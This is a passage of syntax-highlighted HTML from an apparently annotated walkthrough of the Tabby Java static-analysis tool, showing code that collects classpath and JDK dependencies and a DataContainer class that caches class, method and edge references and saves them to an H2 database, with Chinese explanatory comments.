punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                allTargets<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cp<span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> filename <span class="token operator">=</span> temp<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> fileMd5 <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getFileMD5</span><span class="token punctuation">(</span>cp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_WEB_MODE</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span>rulesContainer<span class="token punctuation">.</span><span class="token function">isInCommonJarList</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span>libraries<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>fileMd5<span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    allTargets<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>fileMd5<span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> allTargets<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">collectJdkDependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> allJdkDependencies <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> javaHome <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">JavaVersion</span><span class="token punctuation">.</span><span class="token function">isAtLeast</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// jdk >= 9</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_WITH_ALL_JDK</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                allJdkDependencies<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">findAllJdkDependencies</span><span class="token punctuation">(</span>javaHome<span class="token operator">+</span><span class="token string">"/jmods/"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> path <span class="token operator">=</span> javaHome<span class="token operator">+</span><span class="token string">"/jmods/java.base.jmod"</span><span class="token punctuation">;</span>                <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    allJdkDependencies<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getFileMD5</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token comment">// jdk &lt;= 8</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_WITH_ALL_JDK</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                allJdkDependencies<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">findAllJdkDependencies</span><span class="token punctuation">(</span>javaHome<span class="token operator">+</span><span class="token string">"/lib"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                allJdkDependencies<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">findAllJdkDependencies</span><span class="token punctuation">(</span>javaHome<span class="token operator">+</span><span class="token string">"/../lib"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> jre <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"lib/rt.jar"</span><span class="token punctuation">,</span><span class="token string">"lib/jce.jar"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> cp<span class="token operator">:</span>jre<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> javaHome<span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        allJdkDependencies<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getFileMD5</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> allJdkDependencies<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycorecontainerdatacontainer.java">tabby/core/container/DataContainer.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Getter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Setter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>scheduling<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Async</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>scheduling<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">AsyncResult</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">SootClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">SootMethod</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">SootMethodRef</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>scanner<span class="token punctuation">.</span></span><span class="token class-name">ClassInfoScanner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>edge<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>ref<span class="token punctuation">.</span></span><span class="token class-name">ClassReference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>ref<span class="token punctuation">.</span></span><span class="token class-name">MethodReference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ClassRefService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">MethodRefService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">RelationshipsService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ClassService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">MethodService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">SemanticHelper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Future</span></span><span class="token punctuation">;</span><span class="token comment">/** * global tabby.core.data container * @author wh1t3P1g * @since 2021/1/7 */</span><span class="token annotation punctuation">@Getter</span><span class="token annotation punctuation">@Setter</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DataContainer</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// @Autowired 注解用于将依赖项注入到字段中。在 DataContainer 类中，@Autowired 注解用于注入 RulesContainer、ClassService、MethodService、ClassRefService、MethodRefService 和 RelationshipsService 依赖项。这些依赖项都用于执行 DataContainer 类的任务。</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">RulesContainer</span> rulesContainer<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ClassService</span> classService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">MethodService</span> methodService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ClassRefService</span> classRefService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">MethodRefService</span> methodRefService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">RelationshipsService</span> relationshipsService<span class="token punctuation">;</span>    <span class="token comment">//    private Map&lt;String, ClassReference> savedClassRefs = new HashMap&lt;>();</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">ClassReference</span><span class="token punctuation">></span></span> savedClassRefs <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedMap</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//    private Map&lt;String, MethodReference> savedMethodRefs = new HashMap&lt;>();</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">MethodReference</span><span class="token punctuation">></span></span> savedMethodRefs <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedMap</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Has</span><span class="token punctuation">></span></span> savedHasNodes <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedSet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Call</span><span class="token punctuation">></span></span> savedCallNodes <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedSet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Alias</span><span class="token punctuation">></span></span> savedAliasNodes <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedSet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Extend</span><span class="token punctuation">></span></span> savedExtendNodes <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedSet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Interfaces</span><span class="token punctuation">></span></span> savedInterfacesNodes <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedSet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * check size and save nodes     * 保存节点到h2 database     */</span>    <span class="token comment">// 该方法用于将数据容器中的数据保存到 H2 数据库中。</span>    <span class="token comment">// 该方法首先根据 type 参数判断要保存的数据类型。然后，根据数据类型，调用相应的服务来保存数据</span>    <span class="token comment">// 在保存数据之前，该方法会先检查 savedXXXNodes 列表是否为空。如果为空，则说明数据已经保存过了，不需要再次保存。</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token string">"class"</span><span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>savedClassRefs<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ClassReference</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>savedClassRefs<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    savedClassRefs<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    classRefService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"method"</span><span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>savedMethodRefs<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MethodReference</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>savedMethodRefs<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    savedMethodRefs<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    methodRefService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"has"</span><span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>savedHasNodes<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    relationshipsService<span class="token punctuation">.</span><span class="token function">saveAllHasEdges</span><span class="token punctuation">(</span>savedHasNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                    savedHasNodes<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"call"</span><span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>savedCallNodes<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    relationshipsService<span class="token punctuation">.</span><span class="token function">saveAllCallEdges</span><span class="token punctuation">(</span>savedCallNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                    savedCallNodes<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"extend"</span><span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>savedExtendNodes<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    relationshipsService<span class="token punctuation">.</span><span class="token function">saveAllExtendEdges</span><span class="token punctuation">(</span>savedExtendNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                    savedExtendNodes<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"interfaces"</span><span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>savedInterfacesNodes<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    relationshipsService<span class="token punctuation">.</span><span class="token function">saveAllInterfacesEdges</span><span class="token punctuation">(</span>savedInterfacesNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                    savedInterfacesNodes<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"alias"</span><span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>savedAliasNodes<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    relationshipsService<span class="token punctuation">.</span><span class="token function">saveAllAliasEdges</span><span class="token punctuation">(</span>savedAliasNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                    savedAliasNodes<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * store nodes     * 保存节点到内存     * insert if node not exist     * replace if node exist     * @param ref node     * @param &lt;T> node type     */</span>    <span class="token comment">// 该方法用于将节点保存到内存中。该方法根据 ref 的类型，将其保存到相应的集合中</span>    <span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">void</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token class-name">T</span> ref<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token keyword">instanceof</span> <span class="token class-name">ClassReference</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">ClassReference</span> classRef <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ClassReference</span><span class="token punctuation">)</span> ref<span class="token punctuation">;</span>            savedClassRefs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>classRef<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> classRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token keyword">instanceof</span> <span class="token class-name">MethodReference</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">MethodReference</span> methodRef <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">MethodReference</span><span class="token punctuation">)</span> ref<span class="token punctuation">;</span>            savedMethodRefs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>methodRef<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> methodRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token keyword">instanceof</span> <span class="token class-name">Has</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            savedHasNodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Has</span><span class="token punctuation">)</span> ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token keyword">instanceof</span> <span class="token class-name">Call</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            savedCallNodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Call</span><span class="token punctuation">)</span> ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token keyword">instanceof</span> <span class="token class-name">Interfaces</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            savedInterfacesNodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Interfaces</span><span class="token punctuation">)</span> ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token keyword">instanceof</span> <span class="token class-name">Extend</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            savedExtendNodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token 